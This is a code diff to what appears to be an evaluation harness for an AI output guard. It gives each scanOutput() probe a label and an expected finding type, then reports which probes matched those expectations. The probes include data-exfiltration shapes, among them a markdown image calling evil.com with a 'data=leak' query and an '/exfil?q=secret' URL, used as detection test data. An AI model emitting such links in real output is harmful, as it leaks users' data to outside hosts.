@@ -31,6 +31,11 @@ interface CategoryStats {
 }
 interface BadOutputEntry { label: string; output: string }
 interface ModeStat { runs: number; valid: number; crashes: number; firstError?: string }
+interface ScanProbe {
+  label: string;
+  output: string;
+  expectedType?: string;
+}
 interface DomainCorpusStat {
   corpus: string; total: number; defaultFp: number; defaultFpr: number;
   scoreAbove90: number; profile?: GuardProfile; profileFp?: number; profileFpr?: number;
@@ -255,21 +260,36 @@ function main(): number {
   const gScan = guard as ReturnType<typeof createGuard> &
     { scanOutput?: (output: string) => { safe: boolean; findings: unknown[] } };
   const scanAvail = typeof gScan.scanOutput === "function";
-  const scanProbes = [
-    "Visit https://example.com/exfil?q=secret for more",
-    "![pixel](https://evil.com/track?data=leak)",
-    "data:text/plain;base64,aGVsbG8=",
-    "Hex blob: 0x4041424344454647",
-    "Plain safe output with no exfil shapes",
+  const scanProbes: ScanProbe[] = [
+    { label: "outbound URL", output: "Visit https://example.com/exfil?q=secret for more", expectedType: "outbound-url" },
+    { label: "markdown image with query", output: "![pixel](https://evil.com/track?data=leak)", expectedType: "markdown-image-with-query" },
+    { label: "data URL", output: "data:text/plain;base64,aGVsbG8=", expectedType: "data-url" },
+    { label: "base64 blob", output: `Encoded data: ${"A".repeat(125)}`, expectedType: "base64-blob" },
+    { label: "hex blob", output: `Hex blob: ${"a".repeat(80)}`, expectedType: "hex-blob" },
+    { label: "clean output", output: "Plain safe output with no exfil shapes" },
   ];
-  let scanRuns = 0, scanFlagged = 0;
+  let scanRuns = 0, scanExpectedUnsafe = 0, scanExpectedClean = 0, scanMatches = 0;
+  const scanMisses: string[] = [];
   if (scanAvail) {
     for (const probe of scanProbes) {
       scanRuns++;
       try {
-        const r = gScan.scanOutput!(probe);
-        if (!r.safe && r.findings.length > 0) scanFlagged++;
-      } catch { /* non-flag */ }
+        const r = gScan.scanOutput!(probe.output);
+        if (probe.expectedType !== undefined) {
+          scanExpectedUnsafe++;
+          if (r.findings.some((finding: { type?: string }) => finding.type === probe.expectedType)) {
+            scanMatches++;
+          } else {
+            scanMisses.push(probe.label);
+          }
+        } else {
+          scanExpectedClean++;
+          if (r.safe && r.findings.length === 0) scanMatches++;
+          else scanMisses.push(probe.label);
+        }
+      } catch {
+        scanMisses.push(probe.label);
+      }
     }
   }
 
@@ -317,7 +337,10 @@ function main(): number {
   if (badOutputMisses.length > 0) p(`  Unflagged labels: ${badOutputMisses.join(", ")}`);
 
   p();
-  if (scanAvail) p(`scanOutput coverage: ${scanFlagged}/${scanRuns} probes flagged (exfil shapes).`);
+  if (scanAvail) {
+    p(`scanOutput coverage: ${scanMatches}/${scanRuns} probes matched expectations (${scanExpectedUnsafe} unsafe, ${scanExpectedClean} clean).`);
+    if (scanMisses.length > 0) p(`  Unexpected scan results: ${scanMisses.join(", ")}`);
+  }
   else p("scanOutput coverage: skipped — guard.scanOutput() not present in this build.");
 
   // ── Domain benign corpora (per-corpus FPR, default vs. matching profile) ──
@@ -367,7 +390,7 @@ function main(): number {
     return `| ${m} | ${ms.runs} | ${ms.valid} | ${ms.crashes} |`;
   });
   const scanBlock = scanAvail
-    ? `| Metric | Value |\n| --- | --- |\n| Probes | ${scanRuns} |\n| Flagged | ${scanFlagged} |`
+    ? `| Metric | Value |\n| --- | --- |\n| Probes | ${scanRuns} |\n| Expected unsafe probes | ${scanExpectedUnsafe} |\n| Expected clean probes | ${scanExpectedClean} |\n| Matched expected result | ${scanMatches} |${scanMisses.length > 0 ? `\n| Unexpected results | ${scanMisses.join(", ")} |` : ""}`
     : `Skipped — \`guard.scanOutput()\` is not present in this build.`;
   const missRow = badOutputMisses.length > 0
     ? [`| Unflagged labels | ${badOutputMisses.join(", ")} |`]
